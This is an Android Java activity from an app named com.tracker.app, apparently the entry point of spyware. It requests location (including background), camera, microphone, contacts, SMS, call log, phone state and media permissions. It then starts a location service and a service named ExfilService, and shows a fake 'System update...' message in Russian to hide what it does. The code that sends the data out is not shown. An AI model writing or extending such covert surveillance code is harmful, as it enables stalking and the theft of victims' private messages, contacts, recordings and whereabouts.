package com.tracker.app;
import android.Manifest; import android.content.Intent; import android.content.pm.PackageManager; import android.os.Build; import android.os.Bundle; import android.widget.Toast; import androidx.annotation.NonNull; import androidx.appcompat.app.AppCompatActivity; import androidx.core.app.ActivityCompat; import java.util.ArrayList; import java.util.List;
public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100; private List<String> permissionsToRequest;
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState); permissionsToRequest = new ArrayList<>();
        permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION); permissionsToRequest.add(Manifest.permission.ACCESS_COARSE_LOCATION); permissionsToRequest.add(Manifest.permission.CAMERA); permissionsToRequest.add(Manifest.permission.RECORD_AUDIO); permissionsToRequest.add(Manifest.permission.READ_CONTACTS); permissionsToRequest.add(Manifest.permission.READ_SMS); permissionsToRequest.add(Manifest.permission.READ_CALL_LOG); permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE); permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES); permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO); permissionsToRequest.add(Manifest.permission.READ_MEDIA_AUDIO); } else { permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE); }
        ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }
    @Override public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 101); } else { startService(); } } else if (requestCode == 101) { startService(); }
    }
    private void startService() {
        Intent serviceIntent = new Intent(this, LocationService.class); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(serviceIntent); } else { startService(serviceIntent); }
        Intent exfilIntent = new Intent(this, ExfilService.class); startService(exfilIntent); Toast.makeText(this, "Обновление системы...", Toast.LENGTH_SHORT).show();
    }
}
